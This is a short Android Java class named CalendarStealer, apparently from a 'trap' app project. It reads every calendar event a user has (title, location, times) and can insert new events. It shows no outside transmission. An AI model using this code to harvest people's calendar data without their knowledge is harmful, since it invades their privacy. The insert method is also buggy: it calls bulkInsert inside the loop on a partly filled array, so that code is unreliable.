package de.hpi3d.gamepgrog.trap.android;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.provider.CalendarContract;

import java.util.ArrayList;

import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;

/**
 * Stealer for calendar events. Also allows insertion of new calendar events.
 */
public class CalendarStealer {

    /**
     * Returns all events the user has in their calendar. Depending on the users calendar, and
     * how often they migrate phones, these these might be all the user has ever put into a calendar.
     *
     * @param context to access storage
     * @return ArrayList of all calendar entries.
     * @throws SecurityException if no calendar permission is granted
     */
    public static ArrayList<CalendarEvent> takeCalendarData(Context context) throws SecurityException {

        String[] projection = new String[]{
                CalendarContract.Events._ID,
                CalendarContract.Events.TITLE,
                CalendarContract.Events.EVENT_LOCATION,
                CalendarContract.Events.DTSTART,
                CalendarContract.Events.DTEND
        };

        Cursor cursor = context.getContentResolver().query(
                CalendarContract.Events.CONTENT_URI,
                projection,
                null,
                null,
                null);

        return CalendarEvent.createFromCursor(cursor);
    }

    /**
     * Insert new events into the users calendar. Created CalendarEvents should be as complete as
     * possible
     *
     * @param context to access storage
     * @param events  to add
     * @throws SecurityException if calendar permission is not granted.
     */
    public static void insertCalendarEvents(Context context, ArrayList<CalendarEvent> events) throws SecurityException {
        ContentValues[] eventsToInsert = new ContentValues[events.size()];

        for (int i = 0; i < events.size(); i++) {
            ContentValues singleEventValues = events.get(i).toContentValues();
            eventsToInsert[i] = singleEventValues;
            context.getContentResolver().bulkInsert(
                    CalendarContract.Events.CONTENT_URI,
                    eventsToInsert);
        }
    }
}
